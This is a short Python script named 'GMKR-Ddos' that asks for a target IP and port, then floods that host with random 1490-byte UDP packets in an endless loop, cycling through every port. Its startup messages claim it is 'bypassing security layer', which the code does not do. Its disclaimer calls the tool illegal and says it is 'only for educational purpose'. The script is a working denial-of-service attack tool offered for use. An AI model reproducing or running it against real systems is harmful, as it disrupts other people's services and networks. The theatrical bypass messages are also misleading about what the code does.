import socket
import random
import time

def main():
    print("GMKR-Ddos".center(50, "-"))
    print("Coded By : SPAKS")
    print("Author   : SPAKS")
    print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk, We aren't responsible for your actions")
    print()

    ip = input("IP Target : ")
    port = int(input("Port       : "))

    print("Team : GAMKERS")
    print("\033[92m")
    print("_TRYING TO REACH THE SERVER")
    time.sleep(1)
    print("ESTABLISHING CONNECTION")
    time.sleep(1)
    print("0100100 BYPASSING SECURITY LAYER 001010")
    time.sleep(1)
    print("CONNECTION ESTABLISHED_")
    time.sleep(1)
    print("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
    time.sleep(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        if port > 65535:
            port = 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        time.sleep(0.1)  # Adjust the sleep time as needed

if __name__ == "__main__":
    main()
